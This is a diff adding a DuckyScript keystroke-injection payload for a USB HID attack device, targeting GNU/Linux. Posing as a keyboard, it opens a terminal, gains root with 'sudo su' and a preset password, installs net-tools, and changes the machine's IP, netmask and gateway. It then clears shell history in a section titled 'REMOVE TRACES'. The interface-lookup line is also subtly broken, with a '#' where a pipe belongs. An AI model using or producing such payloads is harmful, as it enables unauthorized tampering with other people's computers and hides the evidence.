@@ -1,0 +1,66 @@
+###############################################
+#                                             #
+# Title        : Change Network Configuration #
+# Author       : Aleff                        #
+# Version      : 1.0                          #
+# Category     : Execution                    #
+# Target       : GNU/Linux                    #
+#                                             #
+###############################################
+
+ATTACKMODE HID
+
+# REQUIREMENTS
+#  - Permissions
+
+# VARIABLES
+# 1) You need to know the sudo password and replace 'example' with this
+SUDO_PASS='example'
+# 2) Set your NEW_IP i.e. 192.168.1.100
+NEW_IP='example'
+# 3) Set your NEW_MASK i.e. 255.255.255.0
+NEW_MASK='example'
+# 4) Set your NEW_GATEWAY i.e.192.168.1.1
+NEW_GATEWAY='example'
+
+QUACK DELAY 1500
+QUACK CTRL-ALT t
+QUACK DELAY 2000
+
+#### PERMISSIONS SECTION ####
+QUACK STRING sudo su
+QUACK ENTER
+QUACK DELAY 1000
+QUACK STRING $SUDO_PASS
+QUACK ENTER
+QUACK DELAY 1000
+
+#### IP SECTION ####
+# net-tools command
+QUACK STRING apt install net-tools
+QUACK ENTER
+QUACK DELAY 2000
+
+# Set network interface
+QUACK STRING IP='$NEW_IP'
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING MASK='$NEW_MASK'
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING GATEWAY='$NEW_GATEWAY'
+QUACK ENTER
+QUACK DELAY 500
+
+# Get the net interface name
+QUACK STRING INTERFACE=\$(ip route get 8.8.8.8 # awk '{print \$5}')
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING ifconfig $INTERFACE $NEW_IP netmask $NEW_MASK up
+QUACK ENTER
+QUACK DELAY 500
+
+#### REMOVE TRACES ####
+QUACK STRING history -c; exit
+QUACK ENTER
+QUACK DELAY 500
